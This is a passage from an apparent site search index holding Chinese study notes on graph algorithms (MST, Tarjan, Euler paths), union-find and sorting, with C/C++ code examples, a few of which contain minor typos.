<li>\u4e00\u4e2a\u56fe\u53ef\u4ee5\u6709\u591a\u4e2a\u751f\u6210\u6811\uff0c\u4e5f\u53ef\u4ee5\u6709\u591a\u4e2a\u6700\u5c0f\u751f\u6210\u6811</li> <li>\u5bf9\u4e8e\u5305\u542b \\(n\\) \u4e2a\u9876\u70b9\u7684\u65e0\u5411\u5b8c\u5168\u56fe\u6700\u591a\u5305\u542b\\(n^{n-2}\\)\u9897\u751f\u6210\u6811\u3002</li> <li>\u751f\u6210\u6811\u4e2d\u4e0d\u5b58\u5728\u73af</li> <li>\u79fb\u9664\u751f\u6210\u6811\u7684\u4efb\u610f\u4e00\u6761\u8fb9\u90fd\u4f1a\u5bfc\u81f4\u56fe\u7684\u4e0d\u8fde\u901a</li> <li>\u5728\u751f\u6210\u6811\u4e2d\u4efb\u610f\u6dfb\u52a0\u4e00\u6761\u8fb9\u90fd\u4f1a\u6784\u6210\u73af</li> </ul>"},{"location":"Courses/DS/FDS/%E5%9B%BE/#prim","title":"Prim\u7b97\u6cd5","text":"<ol> <li>\u4efb\u610f\u9009\u62e9\u4e00\u4e2a\u70b9\uff0c\u52a0\u5165\u751f\u6210\u6811(\u5df2\u7ecf\u751f\u6210\u7684\u90e8\u5206)</li> <li>\u9009\u62e9\u4e0e\u8fd9\u4e2a\u70b9\u76f8\u8fde\u7684\u6743\u503c\u6700\u5c0f\u7684\u8fb9\u548c\u70b9\u52a0\u5165\u5230\u751f\u6210\u6811</li> <li>\u5bf9\u4e8e\u5df2\u7ecf\u751f\u6210\u7684\u90e8\u5206\uff0c\u518d\u6b21\u91cd\u590d2</li> <li>\u5f53\u6240\u6709\u70b9\u52a0\u5165\u540e\uff0c\u505c\u6b62</li> </ol>"},{"location":"Courses/DS/FDS/%E5%9B%BE/#kruskal","title":"Kruskal\u7b97\u6cd5","text":"<ol> <li>\u9009\u62e9\u6743\u503c\u6700\u5c0f\u7684\u8fb9\u53ca\u4e0e\u5b83\u76f8\u8fde\u7684\u70b9\u52a0\u5165\u751f\u6210\u6811</li> <li>\u4ece\u539f\u56fe\u4e2d\u5220\u53bb\u8fd9\u6761\u8fb9</li> <li>\u9009\u53d6\u6743\u503c\u6700\u5c0f\u7684\u4e14\u4e0d\u6784\u6210Circle\u7684\u8fb9\u548c\u70b9\u52a0\u5165\u751f\u6210\u6811 (\u4e0d\u8981\u6c42\u548c\u5df2\u7ecf\u751f\u6210\u7684\u90e8\u5206\u76f8\u8fde)</li> <li>\u4ece\u539f\u56fe\u4e2d\u5220\u53bb\u8fd9\u6761\u8fb9</li> <li>\u91cd\u590d3\u30014\u76f4\u5230\u5305\u542b\u6240\u6709\u70b9</li> </ol> <p>\u5728\u751f\u6210\u6700\u5c0f\u751f\u6210\u6811MST\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u91c7\u7528\u5e76\u67e5\u96c6\u7684\u6570\u636e\u7ed3\u6784\u6765\u8868\u793a\u8fb9\u7684\u8fde\u63a5\u5173\u7cfb\u3002</p> <p>Prim\u7b97\u6cd5\u66f4\u9002\u5408 Dense Graph</p>"},{"location":"Courses/DS/FDS/%E5%9B%BE/#dfs","title":"DFS\u7684\u53e6\u4e00\u4e2a\u5e94\u7528","text":"<ul> <li>articulation point: \u6307\u4e00\u4e2a\u70b9\uff0c\u5982\u679c\u628a\u8fd9\u4e2a\u70b9\u4ece\u56fe\u91cc\u5220\u53bb\uff0c\u5219\u8fd9\u4e2a\u56fe\u81f3\u5c11\u6709\u4e24\u4e2aconnected components<ul> <li>\u4ea6\u65e2\u79bb\u6563\u6570\u5b66\u4e2d\u7684Cut Vertex</li> </ul> </li> <li>biconnected graph: \u6307\u4e0d\u5b58\u5728 articulation point \u7684\u8fde\u901a\u56fe</li> <li>\u4e00\u4e2abiconnected component\u662f maximal biconnected subgraph</li> </ul> <p>Example</p> <p></p> <p>\u5bfb\u627ebiconnected component\u7684Tarjan\u7b97\u6cd5\u4e3a\uff1a</p> <ul> <li>\u7528DFS\u904d\u5386\u4e00\u904d\u6811\uff0c\u5e76\u5f62\u6210\u6df1\u5ea6\u4f18\u5148spanning tree<ul> <li></li> </ul> </li> <li>\u5224\u65ad\u662farticulation point\u7684\u6761\u4ef6\u662f\uff1a<ul> <li>\u5982\u679c\u6811\u7684\u6839\u8282\u70b9root\u6709\u81f3\u5c11\u4e24\u4e2a\u5b50\u8282\u70b9\uff0c\u5219root\u4e3aarticulation point</li> <li>\u5bf9\u4e8e\u975e\u6839\u8282\u70b9u\uff0c\u5982\u679cu\u6709\u81f3\u5c11\u4e00\u4e2a\u5b69\u5b50\uff0c\u5e76\u4e14\u4e0d\u80fd\u5411\u4e0b\u79fb\u52a8\u4e00\u6b65\u518d\u901a\u8fc7\u8def\u7ebf(\u5305\u62ec\u865a\u7ebf)\u8d70\u56deu\u7684\u7956\u5148(\u4e0d\u5305\u62ecu\u81ea\u5df1)\uff0c\u90a3\u4e48u\u4e3aarticulation point</li> </ul> </li> <li>\u5199\u6210\u7a0b\u5e8f\u8bed\u8a00\uff0c\u5219\u5bf9\u4e8e\u6bcf\u4e00\u4e2avertex\u6709\u4e24\u4e2a\u53c2\u6570\uff0c<code>Num</code> \u6307DFS\u65f6\u88ab\u904d\u5386\u7684\u6b21\u5e8f\uff0c<code>Low</code> \u6307\u4ece\u8fd9\u4e2a\u70b9\u5411\u4e0b\u8d70\u65f6\u7ecf\u8fc7\u7684\u6700\u5c0f\u7684 <code>Num</code>(\u53ef\u4ee5\u7ecf\u8fc7\u865a\u7ebf\u56de\u53bb)\u3002\u90a3\u4e48\u5982\u679cu\u4e0d\u662froot\uff0c\u4e14u\u5b58\u5728\u4e00\u4e2a\u5b50\u8282\u70b9child\u4f7f\u5f97\\(Low(child)\\ge Num(u)\\) \u5219u\u662farticulation point<ul> <li>\u5bf9\u4e8e\u8ffd\u6eaf\u81f3Low\uff0c\u5176\u8d4b\u503c\u4e3a\uff1a \u521d\u59cbLow[x] = Num[x]</li> <li>\u5bf9\u4e8e\u4ece\u00a0x\u00a0\u5230\u00a0y\u00a0\u7684\u8fb9\uff0c\u5982\u679c\u00a0\u00a0\u5728\u641c\u7d22\u6811\u4e0a\uff0c\u5219\u00a0low[x] = min(low[x], low[y])</li> <li>\u5982\u679c\u00a0\u00a0\u4e0d\u5728\u641c\u7d22\u6811\u4e0a(\u5373\u865a\u7ebf\u90e8\u5206)\uff0c\u5219\u00a0low[x] = min(low[x], num[y])</li> </ul> </li> </ul> <p></p>"},{"location":"Courses/DS/FDS/%E5%9B%BE/#_2","title":"\u6b27\u62c9\u56de\u8def\u4e0e\u6b27\u62c9\u8def\u5f84","text":"<ul> <li>\u6b27\u62c9\u56de\u8def\uff08Euler circuit\uff09\u4e3a\u5305\u542b\u6240\u6709\u8fb9\u7684\u7b80\u5355\u73af\uff0c\u6b27\u62c9\u8def\u5f84\uff08Euler path\uff09\u4e3a\u5305\u542b\u6240\u6709\u8fb9\u7684\u7b80\u5355\u8def\u5f84</li> <li>\u65e0\u5411\u56fe<ul> <li>\u65e0\u5411\u56fe\u00a0G\u00a0\u6709\u6b27\u62c9\u56de\u8def\u5f53\u4e14\u4ec5\u5f53\u00a0G\u00a0\u662f\u8fde\u901a\u7684\u4e14\u6bcf\u4e2a\u9876\u70b9\u7684\u5ea6\u6570\u90fd\u662f\u5076\u6570</li> <li>\u65e0\u5411\u56fe\u00a0G\u00a0\u6709\u6b27\u62c9\u8def\u5f84\u5f53\u4e14\u4ec5\u5f53\u00a0G\u00a0\u662f\u8fde\u901a\u7684\u4e14\u6709\u4e14\u4ec5\u6709\u4e24\u4e2a\u9876\u70b9\u7684\u5ea6\u6570\u662f\u5947\u6570</li> </ul> </li> <li>\u6709\u5411\u56fe<ul> <li>\u6709\u5411\u56fe\u00a0G\u00a0\u6709\u6b27\u62c9\u56de\u8def\u5f53\u4e14\u4ec5\u5f53\u00a0G\u00a0\u662f\u5f31\u8fde\u901a\u7684\u4e14\u6bcf\u4e2a\u9876\u70b9\u7684\u51fa\u5ea6\u7b49\u4e8e\u5165\u5ea6</li> <li>\u6709\u5411\u56fe\u00a0G\u00a0\u6709\u6b27\u62c9\u8def\u5f84\u5f53\u4e14\u4ec5\u5f53\u00a0G\u00a0\u662f\u5f31\u8fde\u901a\u7684\u4e14\u6709\u4e14\u4ec5\u6709\u4e00\u4e2a\u9876\u70b9\u7684\u51fa\u5ea6\u6bd4\u5165\u5ea6\u5927\u00a01\uff0c\u6709\u4e14\u4ec5\u6709\u4e00\u4e2a\u9876\u70b9\u7684\u5165\u5ea6\u6bd4\u51fa\u5ea6\u5927\u00a01\uff0c\u5176\u4f59\u9876\u70b9\u7684\u51fa\u5ea6\u7b49\u4e8e\u5165\u5ea6</li> </ul> </li> <li>dfs\u00a0\u5373\u53ef</li> </ul> <pre><code>void dfs(int x) {\n    for (int y = 1; y &lt;= maxn; ++y) {\n        if (G[x][y]) {\n            G[x][y] = 0;\n            G[y][x] = 0;\n            dfs(y);\n        }\n    }\n    ans[++ansi] = x;\n    return;\n}\nfor (int i = 1; i &lt;= maxn; ++i) {\n    if (deg[i] % 2) {\n        cnt++;\n        if (!root) root = i;\n    }\n}\nif (!root) {\n    for (int i = 1; i &lt;= maxn; ++i) {\n        if (deg[i]) {\n            root = i; \n            break;\n        }\n    }\n}\nif(cnt==2 || cnt == 0){\n    dfs(root);\n}else{\n    printf(\"No Solution\\n\");\n    return 0;\n}\n</code></pre>"},{"location":"Courses/DS/FDS/%E5%9B%BE/#tarjan","title":"\u6c42\u5f3a\u8fde\u901a\u5206\u91cf\u7684Tarjan\u7b97\u6cd5","text":"<p>\u5f3a\u8fde\u901a\u5206\u91cf - OI Wiki (oi-wiki.org)</p> <p>\u5728 Tarjan \u7b97\u6cd5\u4e2d\u4e3a\u6bcf\u4e2a\u7ed3\u70b9\u00a0u\u00a0\u7ef4\u62a4\u4e86\u4ee5\u4e0b\u51e0\u4e2a\u53d8\u91cf\uff1a</p> <ol> <li>dfn[u]\uff1a\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\u904d\u5386\u65f6\u7ed3\u70b9 u \u88ab\u641c\u7d22\u7684\u6b21\u5e8f\u3002</li> <li>low[u]\uff1a\u5728 u\u00a0\u7684\u5b50\u6811\u4e2d\u80fd\u591f\u56de\u6eaf\u5230\u7684\u6700\u65e9\u7684\u5df2\u7ecf\u5728\u6808\u4e2d\u7684\u7ed3\u70b9\u3002\u8bbe\u4ee5\u00a0u\u00a0\u4e3a\u6839\u7684\u5b50\u6811\u4e3a\u00a0Subtree[u] \u3002low[u]\u00a0\u5b9a\u4e49\u4e3a\u4ee5\u4e0b\u7ed3\u70b9\u7684\u00a0dfn\u00a0\u7684\u6700\u5c0f\u503c\uff1aSubtree[u]\u00a0\u4e2d\u7684\u7ed3\u70b9\uff1b\u4ece\u00a0Subtree[u]\u00a0\u901a\u8fc7\u4e00\u6761\u4e0d\u5728\u641c\u7d22\u6811\u4e0a\u7684\u8fb9\u80fd\u5230\u8fbe\u7684\u7ed3\u70b9\u3002</li> </ol> <p>\u4e00\u4e2a\u7ed3\u70b9\u7684\u5b50\u6811\u5185\u7ed3\u70b9\u7684 dfn \u90fd\u5927\u4e8e\u8be5\u7ed3\u70b9\u7684 dfn\u3002</p> <p>\u4ece\u6839\u5f00\u59cb\u7684\u4e00\u6761\u8def\u5f84\u4e0a\u7684 dfn \u4e25\u683c\u9012\u589e\uff0clow \u4e25\u683c\u975e\u964d\u3002</p> <p>\u6309\u7167\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\u7b97\u6cd5\u641c\u7d22\u7684\u6b21\u5e8f\u5bf9\u56fe\u4e2d\u6240\u6709\u7684\u7ed3\u70b9\u8fdb\u884c\u641c\u7d22\uff0c\u7ef4\u62a4\u6bcf\u4e2a\u7ed3\u70b9\u7684\u00a0<code>dfn</code>\u00a0\u4e0e\u00a0<code>low</code>\u00a0\u53d8\u91cf\uff0c\u4e14\u8ba9\u641c\u7d22\u5230\u7684\u7ed3\u70b9\u5165\u6808\u3002\u6bcf\u5f53\u627e\u5230\u4e00\u4e2a\u5f3a\u8fde\u901a\u5143\u7d20\uff0c\u5c31\u6309\u7167\u8be5\u5143\u7d20\u5305\u542b\u7ed3\u70b9\u6570\u76ee\u8ba9\u6808\u4e2d\u5143\u7d20\u51fa\u6808\u3002\u5728\u641c\u7d22\u8fc7\u7a0b\u4e2d\uff0c\u5bf9\u4e8e\u7ed3\u70b9\u00a0u\u00a0\u548c\u4e0e\u5176\u76f8\u90bb\u7684\u7ed3\u70b9\u00a0v\uff08v\u00a0\u4e0d\u662f\u00a0u\u00a0\u7684\u7236\u8282\u70b9\uff09\u8003\u8651 3 \u79cd\u60c5\u51b5\uff1a</p> <ol> <li>v \u672a\u88ab\u8bbf\u95ee\uff1a\u7ee7\u7eed\u5bf9\u00a0v\u00a0\u8fdb\u884c\u6df1\u5ea6\u641c\u7d22\u3002\u5728\u56de\u6eaf\u8fc7\u7a0b\u4e2d\uff0c\u7528\u00a0low[v]\u00a0\u66f4\u65b0\u00a0low[u] \u3002\u56e0\u4e3a\u5b58\u5728\u4ece\u00a0u\u00a0\u5230\u00a0v\u00a0\u7684\u76f4\u63a5\u8def\u5f84\uff0c\u6240\u4ee5\u00a0v\u00a0\u80fd\u591f\u56de\u6eaf\u5230\u7684\u5df2\u7ecf\u5728\u6808\u4e2d\u7684\u7ed3\u70b9\uff0cu\u00a0\u4e5f\u4e00\u5b9a\u80fd\u591f\u56de\u6eaf\u5230\u3002</li> <li>v\u00a0\u88ab\u8bbf\u95ee\u8fc7\uff0c\u5df2\u7ecf\u5728\u6808\u4e2d\uff1a\u6839\u636e low \u503c\u7684\u5b9a\u4e49\uff0c\u7528\u00a0dfn[v]\u00a0\u66f4\u65b0\u00a0low[u]\u3002</li> <li>v\u00a0\u88ab\u8bbf\u95ee\u8fc7\uff0c\u5df2\u4e0d\u5728\u6808\u4e2d\uff1a\u8bf4\u660e\u00a0v\u00a0\u5df2\u641c\u7d22\u5b8c\u6bd5\uff0c\u5176\u6240\u5728\u8fde\u901a\u5206\u91cf\u5df2\u88ab\u5904\u7406\uff0c\u6240\u4ee5\u4e0d\u7528\u5bf9\u5176\u505a\u64cd\u4f5c\u3002</li> </ol> <p>\u5c06\u4e0a\u8ff0\u7b97\u6cd5\u5199\u6210\u4f2a\u4ee3\u7801\uff1a</p> <pre><code>TARJAN_SEARCH(int u)\n    vis[u]=true \n    low[u]=dfn[u]=++dfncnt \n    push u to the stack \n    for each (u,v) then do \n        if v has not been searched then \n            TARJAN_SEARCH(v) // \u641c\u7d22 \n            low[u]=min(low[u],low[v]) // \u56de\u6eaf \n        else if v has been in the stack then \n            low[u]=min(low[u],dfn[v])\n</code></pre> <p>C++\u4ee3\u7801\u5b9e\u73b0:</p> <pre><code>int dfn[N], low[N], dfncnt, s[N], in_stack[N], tp; \nint scc[N], sc; // \u7ed3\u70b9 i \u6240\u5728 SCC \u7684\u7f16\u53f7 \nint sz[N]; // \u5f3a\u8fde\u901a i \u7684\u5927\u5c0f \nvoid tarjan(int u) { \n    low[u] = dfn[u] = ++dfncnt, s[++tp] = u, in_stack[u] = 1; \n    for (int i = h[u]; i; i = e[i].nex) { \n        const int &amp;v = e[i].t; \n        if (!dfn[v]) { \n            tarjan(v); \n            low[u] = min(low[u], low[v]); \n        } else if (in_stack[v]) { \n            low[u] = min(low[u], dfn[v]); \n        } \n    } if (dfn[u] == low[u]) { \n        ++sc; \n        while (s[tp] != u) { \n            scc[s[tp]] = sc; \n            sz[sc]++; \n            in_stack[s[tp]] = 0; \n            --tp; \n        } scc[s[tp]] = sc; \n        sz[sc]++; \n        in_stack[s[tp]] = 0; --tp; \n    } \n}\n</code></pre> <p>\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(m+n)\\)</p>"},{"location":"Courses/DS/FDS/%E5%B9%B6%E6%9F%A5%E9%9B%86/","title":"\u5e76\u67e5\u96c6","text":"<p> \u7ea6 104 \u4e2a\u5b57  42 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p>"},{"location":"Courses/DS/FDS/%E5%B9%B6%E6%9F%A5%E9%9B%86/#disjoint-set","title":"Disjoint Set \u5e76\u67e5\u96c6","text":"<p>\u7b49\u4ef7\u5173\u7cfbR\u7684\u4e09\u4e2a\u6027\u8d28:</p> <ul> <li>Reflexive \u81ea\u53cd\u6027\uff1a<ul> <li>\\(a\\ R\\ a,for\\ all\\ a\\in S\\)</li> </ul> </li> <li>Symmetric \u5bf9\u79f0\u6027:<ul> <li>\\(a\\ R\\ b\\ if\\ and\\ only\\ if\\ b\\ R\\ a\\)</li> </ul> </li> <li>Transitive \u4f20\u9012\u6027\uff1a<ul> <li>\\(a\\ R\\ b\\ and\\ b\\ R\\ c\\ implies\\ that\\ a\\ R\\ c\\)</li> </ul> </li> </ul> <p>\u4e00\u822c\u5c06root\u7684\u503c\u8bbe\u4e3a\u5176\u6811\u7684\u5927\u5c0f\u7684\u8d1f\u503c\u3002</p> <p>\u7ed9\u957f\u5ea6\u4e3aN\u7684Union(\u6570\u7ec4\u5b9e\u73b0)\u8d4b\u521d\u503c(\u5373\u5168\u4e3a-1)</p> <pre><code>#include&lt;srting.h&gt;\nint *uni=(int*)malloc(N*sizeof(int));\nmemset(uni,-1,sizeof(uni));\n//\u5bf9\u4e8e\u6574\u6570\u6570\u7ec4\uff0cmemset\u51fd\u6570\u53ea\u80fd\u8d4b\u521d\u503c0\u6216-1\uff0c\u8bf7\u52a1\u5fc5\u6ce8\u610f\n</code></pre>"},{"location":"Courses/DS/FDS/%E5%B9%B6%E6%9F%A5%E9%9B%86/#find","title":"\u4f18\u5316Find\u7b97\u6cd5\uff1a\u8def\u5f84\u538b\u7f29","text":"<pre><code>//\u4f18\u5316\u8fc7\u7684find\u7b97\u6cd5\uff0c\u627eroot\u7684\u65f6\u5019\u987a\u4fbf\u51cf\u5c11\u4e86depth\n//\u9012\u5f52\u7248\u672c\nint Find ( int X , DisjSet S ){\n    if ( S[ X ] &lt;= 0 )\n        return X;\n    else \n        return S[ X ] = Find( S[ X ], S );\n}\n---\n//\u795e\u7684\u7b80\u5316\u7248\u672c\uff1a\nint find(int x) { \n    return ufs[x] == x ? x : ufs[x] = find(ufs[x]);\n}\n</code></pre> <pre><code>//\u8fed\u4ee3\u7248\u672c\nint\u00a0 Find ( int\u00a0 X, DisjSet\u00a0 S ){\u00a0\u00a0 \n    int\u00a0 root,trail,lead;\n\n\u00a0\u00a0\u00a0 for ( root = X; S[ root ] &gt; 0; root = S[ root ] );\u00a0 // find the root\n\u00a0\u00a0\u00a0 for ( trail = X; trail != root; trail = lead ) {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 lead = S[ trail ] ;\u00a0\u00a0\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 S[ trail ] = root ;\u00a0\u00a0\n\u00a0\u00a0\u00a0 }\u00a0 //\u628a\u8def\u4e0a\u9047\u5230\u7684\u8282\u70b9\u5168\u8fde\u63a5\u5230root\u4e0a\n\u00a0\u00a0\u00a0 return\u00a0 root ;\n}\n</code></pre>"},{"location":"Courses/DS/FDS/%E5%B9%B6%E6%9F%A5%E9%9B%86/#union","title":"\u5408\u5e76 Union","text":"<pre><code>void SetUnion(int n1, int n2, int S)\n{\n    int root1, root2;\n    root1 = Find(n1,S);\n    root2 = Find(n2,S);\n    if (-S[root1] &gt; -S[root2]) {\n        S[root1]+=S[root2];\n        S[root2]=root1;\n    } else {\n        S[root2]+=S[root1];\n        S[root1]=root2;\n    }\n}\n//\u6309\u5927\u5c0f\u5408\u5e76\u7684Union\u5e76\u67e5\u96c6\uff0c\u4efb\u4f55\u8282\u70b9\u7684\u6df1\u5ea6\u5747\u4e0d\u4f1a\u8d85\u8fc7$log_2 N$\n</code></pre>"},{"location":"Courses/DS/FDS/%E6%8E%92%E5%BA%8F/","title":"\u6392\u5e8f & \u54c8\u5e0c\u8868","text":""},{"location":"Courses/DS/FDS/%E6%8E%92%E5%BA%8F/#_1","title":"\u6392\u5e8f","text":"<p> \u7ea6 921 \u4e2a\u5b57  126 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p>"},{"location":"Courses/DS/FDS/%E6%8E%92%E5%BA%8F/#sort","title":"Sort \u6392\u5e8f","text":"inplace stable Shell T F Insertion T T Heap T F Merge F T Radix T \u5192\u6ce1 T <ul> <li>\u5bf9\u4e8e\u4e00\u4e2a\u5e8f\u5217\uff0c\u5982\u679c\u5b58\u5728\u4e24\u4e2a\u76f8\u7b49\u7684\u5143\u7d20<ul> <li>\u6392\u5e8f\u540e\u5b83\u4eec\u7684\u76f8\u5bf9\u4f4d\u7f6e\u4e0d\u53d8\uff0c\u5219\u79f0\u8fd9\u4e2a\u6392\u5e8f\u7b97\u6cd5\u662f\u7a33\u5b9a\u7684</li> <li>\u6392\u5e8f\u540e\u5b83\u4eec\u7684\u76f8\u5bf9\u4f4d\u7f6e\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u5219\u79f0\u8fd9\u4e2a\u6392\u5e8f\u7b97\u6cd5\u662f\u4e0d\u7a33\u5b9a\u7684</li> </ul> </li> <li>\u7a33\u5b9a\u6392\u5e8f\uff1a\u5192\u6ce1\u3001\u5f52\u5e76\u3001\u63d2\u5165\u3001\u57fa\u6570</li> <li>\u4e0d\u7a33\u5b9a\u6392\u5e8f\uff1a\u5feb\u6392\u3001\u5e0c\u5c14\u3001\u5806\u6392\u3001\u9009\u62e9</li> </ul> <p>\u5404\u4e2a\u57fa\u4e8e\u6bd4\u8f83\u7684\u7b97\u6cd5\u7684\u6700\u597d\u65f6\u95f4\u590d\u6742\u5ea6</p> <p>\u4ec5\u57fa\u4e8e\u6bd4\u8f83\u7684\u7b97\u6cd5\u80fd\u5f97\u5230\u7684\u6700\u597d\u7684\u300c\u6700\u597d\u65f6\u95f4\u590d\u6742\u5ea6\u300d\u662f \\(O(N)\\)\uff0c \u6700\u597d\u7684\u300c\u6700\u574f\u65f6\u95f4\u590d\u6742\u5ea6\u300d\u662f \\(O(N\\log N)\\)</p>"},{"location":"Courses/DS/FDS/%E6%8E%92%E5%BA%8F/#shellsort","title":"ShellSort \u5e0c\u5c14\u6392\u5e8f","text":"<pre><code>void Shellsort( ElementType A[ ], int N ) {\n\u00a0\u00a0\u00a0\u00a0\u00a0 int\u00a0 i, j, Increment;\n\u00a0\u00a0\u00a0\u00a0\u00a0 int\u00a0 Tmp;\n\u00a0\u00a0\u00a0\u00a0\u00a0 for (Increment = N/2;Increment&gt;0; Increment/=2 )\n\u00a0\u00a0\u00a0\u00a0\u00a0  for ( i = Increment; i &lt; N; i++ ) { \n\u00a0\u00a0\u00a0\u00a0\u00a0  /* insertion sort */\n\u00a0 \u00a0\u00a0\u00a0\u00a0\u00a0 Tmp = A[ i ];\n\u00a0 \u00a0\u00a0\u00a0\u00a0\u00a0 for ( j = i; j &gt;= Increment; j - = Increment )\n\u00a0 \u00a0\u00a0\u00a0\u00a0\u00a0   if( Tmp &lt; A[ j - Increment ] )\n\u00a0   \u00a0 \u00a0\u00a0\u00a0\u00a0\u00a0 A[ j ] = A[ j - Increment ];\n\u00a0   \u00a0 \u00a0\u00a0\u00a0\u00a0else\n\u00a0   \u00a0 \u00a0\u00a0\u00a0\u00a0  break;\n\u00a0 \u00a0\u00a0\u00a0\u00a0\u00a0 A[ j ] = Tmp;\n\u00a0     } /* end for-I and for-Increment loops */\n}\n</code></pre> <p>Note</p> <p>\u91c7\u53d6\u4e0d\u540c\u7684 <code>increment sequence</code> \uff0c\u5e0c\u5c14\u6392\u5e8f\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u7684\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u5e38\u89c1\u7684\u6709 \\(O(n^{3/2}), O(n^ {5/ 4}),O(n ^ {1.3})\\) \u7b49 </p>"},{"location":"Courses/DS/FDS/%E6%8E%92%E5%BA%8F/#heapsort","title":"HeapSort \u5806\u6392\u5e8f","text":"<pre><code>Algorithm 1{\n  BuildHeap(H);//\u5efa\u5806\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aO(N)\n  for(int i=0;i&lt;N;i++)\n    TmpH[i] = DeleteMin(H); //DeleteMin\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aO(logN)\n  for(int i=0;i&lt;N;i++)\n    H[i] = TmpH[i];\n}//\u603b\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aO(NlogN)\n</code></pre> <p>\u6b64\u7b97\u6cd5\u91c7\u53d6\u4e00\u4e2a\u65b0\u7684\u6570\u7ec4\u6765\u5b58\u50a8 <code>DeleteMin</code> \u64cd\u4f5c\u5f97\u5230\u7684\u503c\uff0c\u56e0\u6b64\u6781\u5927\u7a0b\u5ea6\u6d6a\u8d39\u4e86\u7a7a\u95f4\u3002</p> <pre><code>void HeapSort{\n  int i;\n  for(i=N/2;i&gt;=0;i--){ \n  //\u6ce8\u610fHeapSort\u91cc\u9762\u4e00\u822c\u5806\u9876\u5143\u7d20index\u4e3a0\n    PercDown(A,i,N); \n  }for(i=N-1;i&gt;0;i--){\n  //left=index*2+1,right=index*2+2,parent=(index-1)/2\n    Swap(&amp;A[0],&amp;A[i]);\n    PercDown(A,0,i);\n  }\n}\n</code></pre> <p>\u8865\u5145\u4e24\u4e2a\u9700\u8981\u7528\u5230\u7684\u51fd\u6570\uff1a</p> <pre><code>void PercDown(int *list, int index, int N){\n\u00a0 \u00a0 int i,flag = 0;\n\u00a0 \u00a0 int value = list[index];\n\u00a0 \u00a0 while(index*2+1&lt;N){\n\u00a0 \u00a0 \u00a0 \u00a0 i = index*2+1;\n//\u8fd9\u91cc\u7684\u662f\u628a\u5c0f\u7684\u5f80\u4e0bPercolating Down\n\u00a0 \u00a0 \u00a0 \u00a0 if(i+1&lt;N &amp;&amp; list[i]&lt;list[i+1]){\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 ++i;\n\u00a0 \u00a0 \u00a0 \u00a0 }if(value&lt;list[i]){\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 flag = 1;\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 list[index] = list[i];\n\u00a0 \u00a0 \u00a0 \u00a0 }else{\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 break;\n\u00a0 \u00a0 \u00a0 \u00a0 }\n\u00a0 \u00a0 \u00a0 \u00a0 index = i;\n\u00a0 \u00a0 }if(flag == 1)\n\u00a0 \u00a0 \u00a0 \u00a0 list[index] = value;\n}\n\nvoid Swap(int *a, int *b){ \n//\u7528\u6307\u9488\u5f62\u5f0f\u53ef\u4ee5\u76f4\u63a5\u7528\u51fd\u6570\u4ea4\u6362\u4e24\u4e2a\u6570\uff0c\u597d\u8036\n\u00a0 \u00a0 int temp;\n\u00a0 \u00a0 temp = *a;\n\u00a0 \u00a0 *a = *b;\n\u00a0 \u00a0 *b = temp;\n}\n</code></pre>"},{"location":"Courses/DS/FDS/%E6%8E%92%E5%BA%8F/#mergesort","title":"MergeSort \u5f52\u5e76\u6392\u5e8f","text":"<pre><code>void merge_sort(int arr[], int start, int end){\n\u00a0 \u00a0 if(start &gt;= end){\n\u00a0 \u00a0 \u00a0 \u00a0 return;\n\u00a0 \u00a0 }int mid = (start+end)/2;\n\u00a0 \u00a0 merge_sort(arr, start, mid);\n\u00a0 \u00a0 merge_sort(arr, mid+1, end);\n\u00a0 \u00a0 merge(arr, start, mid, end);\n}\n\nvoid merge(int arr[], int start, int mid, int end){\n\u00a0 \u00a0 int result[end-start+1],k=0,i=start,j=mid+1;\n\u00a0 \u00a0 while(i&lt;=mid &amp;&amp; j&lt;=end){\n\u00a0 \u00a0 \u00a0 \u00a0 if(arr[i]&lt;=arr[j]){\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 result[k++] = arr[i++];\n\u00a0 \u00a0 \u00a0 \u00a0 }else{\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 result[k++] = arr[j++];\n\u00a0 \u00a0 \u00a0 \u00a0 }\n\u00a0 \u00a0 }if(j&lt;=end){\n\u00a0 \u00a0 \u00a0 \u00a0 while(j&lt;=end){\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 result[k++] = arr[j++];\n\u00a0 \u00a0 \u00a0 \u00a0 }\n\u00a0 \u00a0 }if(i&lt;=mid){\n\u00a0 \u00a0 \u00a0 \u00a0 while(i&lt;=mid){\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 result[k++] = arr[i++];\n\u00a0 \u00a0 \u00a0 \u00a0 }\n\u00a0 \u00a0 }for(j=0,i=start;j&lt;k;i++,j++){\n\u00a0 \u00a0 \u00a0 \u00a0 arr[i] = result[j];\n\u00a0 \u00a0 }\n}\n</code></pre>"},{"location":"Courses/DS/FDS/%E6%8E%92%E5%BA%8F/#quicksort","title":"QuickSort \u5feb\u901f\u6392\u5e8f","text":"<ul> <li>\u5b9e\u8df5\u4e2d\u4e00\u822c\u6700\u5feb\u7684\u4ee3\u7801</li> 